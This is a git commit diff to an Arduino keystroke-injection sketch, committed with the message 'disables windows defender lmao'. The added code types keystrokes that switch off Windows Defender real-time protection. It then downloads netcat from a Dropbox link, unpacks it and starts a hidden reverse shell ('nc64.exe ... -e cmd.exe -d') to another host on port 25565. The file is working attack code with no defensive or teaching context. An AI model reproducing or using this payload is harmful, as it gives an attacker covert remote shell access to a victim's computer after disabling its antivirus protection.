4e9c0b3313191eb9683e8d4c10fa13d3f198734c
David <davidtoman07@gmail.com>
2024-04-28 17:34:04 +1200

    disables windows defender lmao

--- test/test.ino
+++ test/test.ino
@@ -11,12 +11,53 @@ void setup() {
 
   // Serial.begin(9600);
 
-  while(!Serial);
+  // while(!Serial);
+  delay(400);
 
   // start the magic
   Keyboard.begin();
 
   delay(400);
+
+  // disable real time protection
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(100);
+
+  Keyboard.print("windowsdefender:");
+  typeKey(KEY_RETURN);
+  delay(1500);
+
+  typeKey(KEY_RETURN);
+  delay(100);
+
+  for (int i = 0; i < 5; i++) {
+    typeKey(KEY_TAB);
+    delay(50);
+  }
+
+  delay(50);
+
+  typeKey(KEY_RETURN);
+  delay(100);
+
+  Keyboard.print(" ");
+  delay(750);
+  
+  typeKey(KEY_LEFT_ARROW);
+  delay(100);
+  
+  typeKey(KEY_RETURN);
+  delay(100);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  Keyboard.releaseAll();
+  delay(100);
+
+  // open cmd and get freaky
 
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
@@ -25,7 +66,7 @@ void setup() {
 
   Keyboard.print("cmd");
   typeKey(KEY_RETURN);
-  delay(100);
+  delay(150);
 
   Keyboard.print("cd Downloads");
   typeKey(KEY_RETURN);
@@ -34,31 +75,30 @@ void setup() {
   Keyboard.print("start https://www.dropbox.com/scl/fi/usdj9ro86f1ewzm0re2y0/nc64zip.zip?rlkey=dobuary06vlkoylhwtyli5llh\"&\"st=ld0z7ozs\"&\"dl=1");
   delay(100);
   typeKey(KEY_RETURN);
-  
+
   // file download takes some time
   delay(2000);
 
-  // alt tab back to cmd
+  // alt f4 and get back to cmd
   Keyboard.press(KEY_LEFT_ALT);
-  Keyboard.press(KEY_TAB);
+  Keyboard.press(KEY_F4);
   Keyboard.releaseAll();
   delay(100);
 
   Keyboard.print("tar -xf nc64zip.zip");
   delay(100);
   typeKey(KEY_RETURN);
-  
+
   Keyboard.print("tar -xf nc64.zip");
   delay(100);
   typeKey(KEY_RETURN);
-  
-  Keyboard.print("START /MIN nc64.exe you.arent.getting.my.ip.asshole 25565 -e cmd.exe -d");
+
+  Keyboard.print("START /MIN nc64.exe 192.168.1.75 25565 -e cmd.exe -d & exit");
   delay(100);
   typeKey(KEY_RETURN);
 
   // end the magic
   Keyboard.end();
-
 }
 
 void loop() {
